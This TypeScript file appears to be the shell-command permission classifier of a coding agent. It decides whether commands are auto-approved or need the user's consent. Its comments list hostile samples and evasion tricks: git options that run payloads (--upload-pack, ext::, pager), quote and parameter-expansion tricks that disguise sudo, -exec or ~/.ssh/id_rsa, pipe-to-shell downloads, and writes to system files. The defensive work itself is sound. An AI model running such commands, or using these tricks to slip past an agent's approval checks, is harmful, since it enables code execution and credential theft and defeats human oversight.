  if (!target || /[$`~{}*?[\]]/.test(target) || cwdUnknown) return false;
  const forward = toForwardSlashes(target);
  // `chdir` 先跟随 symlink、再处理 `..`。词法 normalize 会把 `/repo/link/..` 错折成
  // `/repo`，所以只允许不含 `.`/`..`/空分量的绝对路径，且必须精确等于宿主确认 cwd。
  if (!isAbsolutePath(forward) || forward.split('/').slice(1).some((part) => part === '' || part === '.' || part === '..')) return false;
  const base = cwd ?? workspaceRoots[0];
  if (!base) return false;
  const aliasFirmlinks = (platform ?? process.platform) === 'darwin';
  return canonicalPath(forward, aliasFirmlinks) === canonicalPath(base, aliasFirmlinks);
}

function parseGitInvocation(
  tokens: string[],
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): { sub?: string; args: string[] } | undefined {
  // Git 的全局选项位于子命令之前。`git -C /repo show` 中 `/repo` 不是子命令；若直接
  // 寻找第一个非 `-` token，会把它误判为子命令而把只读 show 降级为 prompt。
  // 这里只消费能够静态确认的全局选项。未知/缺值选项一律返回 undefined，让调用方 fail-closed。
  let index = 1;
  while (index < tokens.length) {
    const token = tokens[index];
    if (token === '--') {
      index++;
      break;
    }
    if (!token.startsWith('-')) {
      return { sub: token, args: tokens.slice(index + 1) };
    }
    if (token === '-C') {
      if (!isTrustedGitCwdPath(tokens[index + 1], workspaceRoots, opts.cwd, opts.cwdUnknown === true, opts.platform)) return undefined;
      index += 2;
      continue;
    }
    if (token === '--git-dir' || token === '--work-tree') return undefined;
    if (token === '--namespace') {
      if (index + 1 >= tokens.length || tokens[index + 1] === '') return undefined;
      index += 2;
      continue;
    }
    const attachedCwd = /^-C=?(.*)$/.exec(token);
    if (attachedCwd) {
      if (!isTrustedGitCwdPath(attachedCwd[1], workspaceRoots, opts.cwd, opts.cwdUnknown === true, opts.platform)) return undefined;
      index++;
      continue;
    }
    if (/^--(?:git-dir|work-tree)=/.test(token)) return undefined;
    if (/^--namespace=.+/.test(token)) {
      index++;
      continue;
    }
    if (SAFE_GIT_GLOBAL_FLAGS.has(token)) {
      index++;
      continue;
    }
    return undefined;
  }
  if (index >= tokens.length) return undefined;
  return { sub: tokens[index], args: tokens.slice(index + 1) };
}

function classifyGit(
  tokens: string[],
  segment: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): ReviewVerdict {
  // 高风险 git(强推/硬重置/clean -f)已在 REVIEW_REQUIRED_PATTERNS 命中,这里分只读 vs 写。
  // 写文件 / 跑外部程序的选项(即便子命令"只读")→ 升级:
  //   -o/--output(diff/format-patch/show 写文件,无 shell `>` 可捕获);
  //   --ext-diff(跑外部 diff 驱动=RCE);
  //   -O/--open-files-in-pager(git grep 用指定 pager 打开匹配文件 → 执行任意程序=RCE,
  //     `git grep --open-files-in-pager=./payload pat` 会跑 ./payload)。
  //   --filters/--textconv(git cat-file 对内容跑 clean/smudge filter 或 textconv 驱动 → 执行任意程序=RCE)。
  //   --upload-pack/--receive-pack/--exec(ls-remote/fetch/push 等把 <exec> 当命令跑,连本地仓库也执行 →
  //     `git ls-remote --upload-pack='sh payload' repo` = RCE,codex 报)。
  if (/(?:^|\s)-[oO](?:\b|\S)/.test(segment)) return 'prompt';  // 短选项 -o/-O(写文件 / pager 执行器)
  // 长选项按**前缀**匹配:git 接受唯一前缀缩写(`--upload-p=`、甚至 `--u=` 都等于 --upload-pack,codex 报),
  // 只匹配全称会漏。逐 token 取选项名(去引号/展开),命中任一危险长选项的前缀即升级。极短歧义缩写
  // (`--o`/`--e` 等)被一并升级 —— 这类在 git 里本就歧义报错,fail-closed 可接受。
  const DANGEROUS_GIT_LONG_OPTS = ['--output', '--ext-diff', '--open-files-in-pager', '--filters', '--textconv', '--upload-pack', '--receive-pack', '--exec'];
  for (const tok of tokens) {
    if (!tok.startsWith('--')) continue;
    const name = stripExpansions(tok.split('=')[0].replace(/['"\\]/g, ''));
    if (name.length >= 3 && DANGEROUS_GIT_LONG_OPTS.some((full) => full.startsWith(name))) return 'prompt';
  }
  // 远程助手传输 `ext::<cmd>` / `fd::` 会把 URL 里的命令交给 shell 执行(RCE);即便 ls-remote 最终报错,
  // 命令也已跑(codex 报:`git ls-remote 'ext::sh -c …'`)。任何 git 命令带 ext::/fd:: 传输 → 升级。
  if (/(?:^|[\s'"=])(?:ext|fd)::/.test(segment)) return 'prompt';
  const invocation = parseGitInvocation(tokens, workspaceRoots, opts);
  if (!invocation?.sub || !SAFE_GIT_SUBCOMMANDS.has(invocation.sub)) {
    // `git config --get/--list` 只读;其它 git(commit/checkout/merge/fetch/config 写…)升级。
    if (invocation?.sub === 'config' && /--(?:get|list|get-all)\b/.test(segment)) return 'auto-approve';
    return 'prompt';
  }
  const { sub, args } = invocation;
  // reflog 有破坏性写模式:expire / delete / drop 删除恢复历史(不可逆);只放行 show/exists/裸 reflog(默认 show)。
  if (sub === 'reflog') {
    const next = args.find((t) => !t.startsWith('-'));
    if (next && /^(?:expire|delete|drop)$/.test(next)) return 'prompt';
    return 'auto-approve'; // 裸 / show / exists
  }
  // branch/tag/remote 的子命令名相同但有写变体:只放行读形态,写变体升级。
  if (sub === 'branch' || sub === 'tag') {
    // 删除/改名/复制/强制 flag,或子命令后带位置参数(= 新建分支/标签)→ 写。
    // --edit-description invokes $EDITOR(可执行任意外部程序)→ 升级(copilot P1)。
    if (/\s-(?:d|D|m|M|c|C)\b|\s--(?:delete|move|copy|force|edit-description)\b/.test(segment)) return 'prompt';
    const after = args.filter((t) => !t.startsWith('-'));
    if (after.length > 0) return 'prompt';
    return 'auto-approve';
  }
  if (sub === 'remote') {
    const next = args.find((t) => !t.startsWith('-'));
    if (next && /^(?:add|remove|rm|rename|set-url|set-head|set-branches|prune|update)$/.test(next)) {
      return 'prompt';
    }
    // `remote show` 不带 -n 会联系远端(ext:://insteadOf 可执行 payload,codex P1)→ 升级;带 -n 只读本地配置放行。
    if (next === 'show' && !args.includes('-n')) return 'prompt';
    return 'auto-approve'; // bare / -v / get-url / show -n 等不触网的只读形态
  }
  return 'auto-approve';
}

function classifyShellSegment(
  segment: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): ReviewVerdict {
  const rawTokens = tokenize(segment);
  const unwrapped = unwrapCommand(
    rawTokens,
    opts.cwd ?? workspaceRoots[0],
    opts.cwdUnknown === true,
  );
  const tokens = unwrapped.tokens;
  // 包装器可改变内层 cwd（如 `env -C /extra git …`）。不能把该路径当作可信审批基准；
  // 只要 Git 前经过改目录或 cwd 变得未知，保守交给 prompt。
  const initialCwd = opts.cwd ?? workspaceRoots[0];
  const aliasFirmlinks = (opts.platform ?? process.platform) === 'darwin';
  const wrapperChangedCwd = unwrapped.cwdUnknown
    || (unwrapped.cwd !== undefined && initialCwd !== undefined
      && canonicalPath(unwrapped.cwd, aliasFirmlinks) !== canonicalPath(initialCwd, aliasFirmlinks));
  // 裸 env / 未指定 VARIABLE 的 printenv 会输出整个进程环境(含 provider API key)，不能交给
  // reviewer 自行静默 allow。`-0` / `--null` 只改分隔符，不缩小输出范围；只有存在非选项
  // VARIABLE 参数时才算具名读取并留在灰区。`env FOO=bar cmd` 仍按内层命令分类。
  const printenvArgs = executableName(tokens[0] ?? '') === 'printenv' ? tokens.slice(1) : [];
  let printenvHasVariable = false;
  let printenvOptionsEnded = false;
  for (const token of printenvArgs) {
    if (!printenvOptionsEnded && token === '--') {
      printenvOptionsEnded = true;
      continue;
    }
    if (printenvOptionsEnded || !token.startsWith('-')) {
      printenvHasVariable = true;
      break;
    }
  }
  const dumpsFullEnvironment =
    (tokens.length === 0 && rawTokens.some((token) => executableName(token) === 'env'))
    || (executableName(tokens[0] ?? '') === 'printenv' && !printenvHasVariable);
  if (dumpsFullEnvironment) return 'prompt-each-time';
  // 剥壳后为空段:裸 `env`/`printenv`(dump 环境变量,含凭证)、或纯包裹器无内层命令 —— fail-closed 升级。
  if (tokens.length === 0) return 'prompt';
  // executableName 归一 `.exe`/大小写:Windows/Git Bash 下 `ls.exe`/`cat.exe`/`git.exe status` 等良性
  // 只读命令不应平白落灰区弹窗(与"尽量不打扰"一致);PATH 污染是已存档残口,归一不新增风险。
  const bin = executableName(tokens[0]);
  // 去引号标记 + 去反斜杠转义:防 -ex'ec' / -ex\ec / -'o' 这类把 flag/命令拆开的拼接绕过(bash 会把它们
  // 还原成 -exec 等)。再抹掉参数展开(-ex${UNSET}ec / --pr${UNSET}e=…,codex 报):否则 find/rg 等的
  // 执行 flag 被藏在展开里、审查漏放行、bash 展开成空后才执行。flag/命令检测都在此串上跑。
  const deQuoted = stripExpansions(segment.replace(/['"\\]/g, ''));
  // 去引号内容:判重定向时引号内的 `>` 是数据不是重定向(如 git log --format='%h>%s')。
  const redirectScan = segment.replace(/'[^']*'|"[^"]*"/g, '');
  // 输出重定向(写文件)/ 命令替换(执行任意内容):任何命令带它都不能算只读放行,统一升级。
  // 必须挡在 git/fetch/readonly 判定之前 —— 否则 `curl x > ~/.bashrc`、`cat f > /etc/y` 会被误放行。
  if (OUTPUT_REDIRECTION.test(redirectScan) || COMMAND_SUBSTITUTION.test(segment)) return 'prompt';
  // 带替换/默认值的参数展开(${X:-ec} 等)可代入任意文本、拼出危险 flag/命令,静态不可求值 → 升级
  // (codex 报:`-ex${UNSET:-ec}` 抹空后是 -ex、bash 代入 ec 成 -exec)。挡在 readonly/git/fetch 放行前。
  if (SUBSTITUTION_EXPANSION.test(segment)) return 'prompt';
  // 花括号展开 `{a,b}`/`{x..y}` 或 ANSI-C 转义引用 `$'…'` 出现在命令名(tokens[0])或某个 flag(-…)里 →
  // bash 在分词前展开/解码,可拼出任意命令/flag(`-ex{e..e}c`→-exec、`-ex$'\x65'c`→-exec),静态不可预测 → 升级。
  // 只查命令名/flag 位:位置参数里的 brace 只影响文件名、`grep $'\t' f` 的 ANSI-C 是数据,均不误升级;curl URL glob 另处理。
  if (tokens.some((t, i) => (i === 0 || t.startsWith('-')) && (BRACE_EXPANSION.test(t) || t.includes("$'")))) return 'prompt';
  // 显式路径的可执行文件(./ls、/tmp/ls、bin/ls)不是白名单里的系统工具,不能靠 basename 放行 ——
  // 只信任 **OS 自有**、非特权用户不可写的 bin 目录(/usr/bin、/bin、/usr/sbin、/sbin)。/usr/local/bin 与
  // /opt/homebrew/bin 在 macOS/Homebrew 下当前用户可写(可被替换成木马),不再算可信系统 bin(codex 报);
  // 其余含 `/` 的命令一律 fail-closed 升级。
  const cmd0Raw = tokens[0].replace(/\\/g, '');
  // `..` セグメント正規化でパストラバーサルを遮断 — `/usr/bin/../local/bin/ls` → `/usr/local/bin/ls`(信頼できない)。
  // 注:中文注释: `..` 归一化防路径穿越(/usr/bin/../local/bin/ls 穿越出可信 bin 目录)(copilot 报)。
  const cmd0 = cmd0Raw.startsWith('/')
    ? '/' +
      cmd0Raw
        .split('/')
        .slice(1)
        .reduce<string[]>((parts, seg) => {
          if (seg === '..') parts.pop();
          else if (seg !== '' && seg !== '.') parts.push(seg);
          return parts;
        }, [])
        .join('/')
    : cmd0Raw;
  if (cmd0.includes('/') && !/^\/(?:usr\/s?bin|s?bin)\//.test(cmd0)) return 'prompt';
  if (bin === 'git') {
    if (wrapperChangedCwd) return 'prompt';
    return classifyGit(tokens, deQuoted, workspaceRoots, opts);
  }
  if (isSafeFetch(bin, deQuoted, tokens)) return 'auto-approve';
  if (isSafeReadonlyBin(bin, deQuoted, tokens)) return 'auto-approve';
  // 其余(含所有写操作、未知命令)进入灰区，由轻量 reviewer 静默 allow/block/ask。
  return 'prompt';
}

/**
 * shell 命令整体判定:风险模式先在整条命令上查(跨段管道如 `curl … | sh` 拆段后就查不到了),
 * 再拆顶层段,每段都要过 —— 任一段明确红线→prompt-each-time;任一段需 reviewer→prompt;
 * 全部只读→auto-approve。空/畸形命令 → prompt(交 reviewer，故障时静默 block)。
 */
export function classifyShellCommand(
  command: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions = {},
): ReviewVerdict {
  if (typeof command !== 'string' || command.trim().length === 0) return 'prompt';
  // 两档风险模式都跑以下变体；明确红线优先，命中才 prompt-each-time：
  //  - deEscaped(去引号 + 去反斜杠转义):防 su'do' / su\do / rm -r'f' 这类把关键词拆开的绕过。
  //  - quotesOnly(只去引号、保留 `\`):Windows `\` 路径的凭证检测 —— `cat C:\Users\me\.ssh\id_rsa`
  //    里反斜杠是分隔符,若一并去掉会让凭证正则(前缀含 `\`)失配(copilot 报)。
  //  - deGlobbed(在 deEscaped 上再去掉 shell glob 元字符 `[]{}*?`):防方括号/花括号通配把凭证路径
  //    拆开绕过 —— `cat ~/.ss[h]/id_[r]sa` 审查时不含字面 `.ssh`,shell 展开后才成 `~/.ssh/id_rsa`
  //    (greptile 报)。去掉 `[]{}` 让 `.ss[h]`→`.ssh`、`id_[r]sa`→`id_rsa` 现形;去 `*?` 让 `*.pem`
  //    等也归一。会造成个别良性命令过度升级(fail-closed 方向,可接受);`?`/`*` 作单字符替身的
  //    残口(`.ss?`→`.ss` 不复原)属静态不可闭合、极冷门,不追。
  const deEscaped = command.replace(/['"\\]/g, '');
  const quotesOnly = command.replace(/['"]/g, '');
  const deGlobbed = deEscaped.replace(/[[\]{}*?]/g, '');
  // deExpanded:抹掉参数展开(见 stripExpansions)—— 防 `s${X}udo`/`rm -r${X}f /` 这类把关键词拆开、
  // bash 展开成空后才成形的绕过。**必须从 deEscaped 派生**(保留 `${...}` 完整):若先去 glob 会把
  // `${X}` 的 `{}` 抹成 `$X`,再 stripExpansions 会把 `$Xudo` 整词吞掉、反而复原不出 `sudo`。
  // deExpandedGlob:再叠加去 glob,覆盖 `${X}` 与 `[h]` 混用的组合变形。
  const deExpanded = stripExpansions(deEscaped);
  const deExpandedGlob = deExpanded.replace(/[[\]{}*?]/g, '');
  // deSubstituted:把 `${X:-sudo}` 等默认值代入,让藏在展开默认值里的危险关键词现形(codex 报)。
  const deSubstituted = substituteDefaults(deEscaped);
  // 仅按引号外的真实执行结构识别 pipe→解释器 / eval / 下载即执行，避免把打印示例文本误升级。
  if ([command, stripExpansions(command), substituteDefaults(command)]
    .some((variant) => highImpactExecutionNeedsConsent(variant))) return 'prompt-each-time';
  for (const re of ALWAYS_ASK_PATTERNS) {
    if (re.test(deEscaped) || re.test(quotesOnly) || re.test(deGlobbed) || re.test(deExpanded) || re.test(deExpandedGlob) || re.test(deSubstituted)) return 'prompt-each-time';
  }
  // 抓云 metadata = 读实例临时云凭证,静态可证的高危 → 与内置 WebFetch(reviewAction network)一致地
  // 确定性必问,不能一边硬问一边只给 shell curl 灰区(自审发现的两通道不一致)。
  // 只认 metadata,不含 localhost/私网 —— `curl localhost:3000` 是开发日常,硬弹窗会违反"尽量不打扰"。
  for (const { text } of splitExecutableSegments(quotesOnly)) {
    const tokens = unwrapWrappers(tokenize(text));
    const bin = executableName(tokens[0] ?? '');
    if (bin !== 'curl' && bin !== 'wget') continue;
    if (tokens.slice(1).some((t) => isFetchTargetToken(t) && isCloudMetadataFetchTarget(t))) {
      return 'prompt-each-time';
    }
  }
  // 写系统/受保护目录(重定向 `cat x > /etc/hosts` 与参数写通道 `cp payload /etc/hosts`、
  // `| tee /etc/hosts`、`truncate -s 0 /etc/passwd`、`tar -C /etc` 等)= 高影响系统写,复用
  // file-write 的系统红线。**判定放在 scopedDestructionNeedsConsent 的分段循环里**,因为那里已经
  // 跨段跟踪有效 cwd(`cd /etc &&`)与包装器改目录(`env -C /etc`)—— 相对写目标必须按有效 cwd 解析
  // (codex 报:按 workspaceRoots 解析会让 `cp /tmp/payload hosts` 配 cwd=/etc 漏成灰区)。
  // 该循环的首个变体就是原始 command(保留引号),含空格的 DEST 靠引号定界不会被拆碎。
  // 删除/强推需要结合目标范围判断，不能只按关键词一刀切：可证明局限在工作区子目录或普通
  // feature ref 的操作进入 reviewer；系统级、区外、整工作区、动态目标和受保护/隐含分支必问。
  // Windows 保留反斜杠路径，避免把 C:\repo\build 去斜杠后误判；POSIX 额外检查去转义形态。
  const scopedVariants = [command, quotesOnly, stripExpansions(quotesOnly), substituteDefaults(quotesOnly)];
  if ((opts.platform ?? process.platform) !== 'win32') {
    scopedVariants.push(deEscaped, deExpanded, deSubstituted);
  }
  if (scopedVariants.some((variant) =>
    scopedDestructionNeedsConsent(variant, workspaceRoots, opts))) return 'prompt-each-time';
  for (const re of REVIEW_REQUIRED_PATTERNS) {
    if (re.test(deEscaped) || re.test(quotesOnly) || re.test(deGlobbed) || re.test(deExpanded) || re.test(deExpandedGlob) || re.test(deSubstituted)) return 'prompt';
  }
  const segments = splitTopLevelSegments(command);
  if (segments.length === 0) return 'prompt';
  let needsPrompt = false;
  for (const seg of segments) {
    const v = classifyShellSegment(seg, workspaceRoots, opts);
    if (v === 'prompt-each-time') return 'prompt-each-time';
    if (v === 'prompt') needsPrompt = true;
  }
  return needsPrompt ? 'prompt' : 'auto-approve';
}

// ─────────────────────────── 路径边界 ───────────────────────────

/**
 * 反斜杠转正斜杠(Windows / 混合分隔符),统一按 `/` 分量判定。POSIX 下含字面反斜杠的文件名
 * 极罕见,归一化成分隔符只会让边界判定更保守(fail-closed 方向),不会放宽越界。
 */
function toForwardSlashes(p: string): string {
  return p.replace(/\\/g, '/');
}

/**
 * 绝对路径判定(平台无关):POSIX `/…` 或任意 Windows 盘符前缀 `C:…`。入参须已 toForwardSlashes。
 * 盘符相对路径(`C:..\Windows`、`C:file` —— 合法但**非**绝对)也算在内:目的不是判"绝对",而是
 * 判"不可安全地拼到 cwd"——盘符前缀一旦拼 cwd 再折叠 `..`,可能字符串前缀误命中工作区而误放行。
 * 故任何 `^[A-Za-z]:` 都不拼 cwd,交 normalizeSlashes/isInsideWorkspace 判,盘符相对路径 fail-closed 到 prompt。
 */
function isAbsolutePath(p: string): boolean {
  return p.startsWith('/') || /^[A-Za-z]:/.test(p);
}

/** 归一化路径:去包裹引号、统一分隔符,相对路径挂到第一个 workspace root(cwd)。 */
function normalizeTarget(target: string, workspaceRoots: string[]): string {
  let p = toForwardSlashes(target.replace(/^['"]|['"]$/g, ''));
  if (!isAbsolutePath(p)) {
    const cwd = workspaceRoots[0];
    if (cwd) p = `${toForwardSlashes(cwd).replace(/\/+$/, '')}/${p.replace(/^\/+/, '')}`;
  }
  return normalizeSlashes(p);
}

/**
 * 折叠 `.`/`..`/重复分隔符,得到规范绝对路径的字符串形态(不触文件系统)。兼容 Windows 盘符前缀
 * `C:`(大小写归一到大写,避免 `C:` vs `c:` 误判;盘符后路径体在 Windows 上大小写不敏感,此处保留
 * 原样只会导致 body 大小写不一致时**过度升级**,是 fail-closed 方向,不会放宽越界)。
 */
function normalizeSlashes(p: string): string {
  const fwd = toForwardSlashes(p);
  const drive = (/^([A-Za-z]:)\//.exec(fwd)?.[1] ?? '').toUpperCase(); // Windows 盘符,如 C:
  const isAbs = fwd.startsWith('/') || drive !== '';
  const parts = (drive ? fwd.slice(drive.length) : fwd).split('/');
  const out: string[] = [];
  for (const part of parts) {
    if (part === '' || part === '.') continue;
    if (part === '..') {
      if (out.length > 0 && out[out.length - 1] !== '..') out.pop();
      else if (!isAbs) out.push('..');
      // 绝对路径(或盘符根)下越过根的 `..` 丢弃。
    } else {
      out.push(part);
    }
  }
  const prefix = drive ? `${drive}/` : isAbs ? '/' : '';
  return prefix + out.join('/');
}

/**
 * 抹平 macOS firmlink:`/private/{var,tmp,etc}` 与 `/{var,tmp,etc}` 是同一物理位置。工具解析出的
 * 绝对路径常带 `/private` 前缀,而 cwd 可能不带 —— 不抹平会把区内写误判成越界。纯字符串,不碰
 * 文件系统(远端路径无 macOS firmlink,原样通过)。
 */
function canonicalPath(p: string, aliasFirmlinks: boolean): string {
  const n = normalizeSlashes(p);
  if (!aliasFirmlinks) return n; // 非 macOS:/private/tmp 与 /tmp 是不同路径,不抹平
  const m = /^\/private(\/(?:var|tmp|etc)(?:\/|$))/.exec(n);
  return m ? n.slice('/private'.length) : n;
}

/**
 * 目标是否落在任一 workspace root 内(含根本身),按路径分量边界判,避免 /foo 命中 /foobar。
 *
 * **已知限制(有意为之):纯词法判定,不解析符号链接。** 若工作区内预先存在指向区外的 symlink
 * (如 `/repo/outside -> /etc`),写 `/repo/outside/x` 会被判为区内。要消除它得 `fs.realpath` ——
 * 但本 core 刻意不碰文件系统(见文件头:探路径存在性是侧信道,且对远端会话路径不可行/不适用)。
 * 缓解:创建该 symlink 本身需要一条 `ln -s`(shell 命令,会按写/未知升级),攻击面限于**预先已存在**
 * 的恶意链接。以 fail-open 的这一窄口,换取无 fs 副作用 + 远端路径可判 + 确定性可测,是刻意取舍。
 */
function isInsideWorkspace(target: string, workspaceRoots: string[], aliasFirmlinks: boolean): boolean {
  const t = canonicalPath(target, aliasFirmlinks);
  for (const root of workspaceRoots) {
    if (!root) continue;
    const r = canonicalPath(root, aliasFirmlinks);
    if (t === r) return true;
    if (t.startsWith(r.endsWith('/') ? r : `${r}/`)) return true;
  }
  return false;
}
